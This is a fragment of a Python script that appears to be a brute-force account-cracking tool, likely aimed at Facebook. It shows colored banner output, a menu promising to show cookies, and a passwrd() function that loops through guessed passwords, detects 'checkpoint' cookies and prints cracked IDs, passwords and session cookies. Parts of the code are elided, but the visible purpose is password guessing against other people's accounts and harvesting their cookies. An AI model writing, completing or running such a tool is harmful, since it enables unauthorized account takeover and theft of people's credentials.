...
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mI came again after a long time ')
time.sleep(5)
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mPikachu is coming again but old from the front but with all the preparations from the inside")
time.sleep(2)
...
def setting():
    ...
    print('\033[0;91m==================')
    print('\033[0;91m==================')
    print("\033[97;1m[\033[92;1m1\033[97;1m] METHOD 1[Agun] [\033[0;92mCookies Show \033[0;91mCP ID Not Show\033[1;37m]")
...
def passwrd():
    ...
    print("\033[97;1m[\033[92;1m+\033[97;1m] \033[10;95m𝙇𝙤𝙫𝙚 𝙛𝙧𝙤𝙢 𝙎𝙞𝙖𝙢")
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\033[0;92m[PIKU-Ok💚] {idf} • {pw}\n\033[0;93m[🐰]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " PIKU,  Ok,  id"')
